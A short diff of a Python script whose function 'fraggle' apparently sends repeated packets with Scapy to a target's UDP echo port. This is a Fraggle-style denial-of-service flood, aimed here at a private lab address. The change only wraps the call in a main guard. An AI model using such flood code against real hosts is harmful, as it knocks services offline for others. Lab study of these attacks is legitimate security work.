@@ -9,4 +9,5 @@ def fraggle(target, port=7):
         print(pkt)
         send(pkt, count=100, inter=0.01) #do while loop for threads ot just more control
 
-fraggle("192.168.56.101")
+if __name__ == '__main__' :
+	fraggle("192.168.56.101")
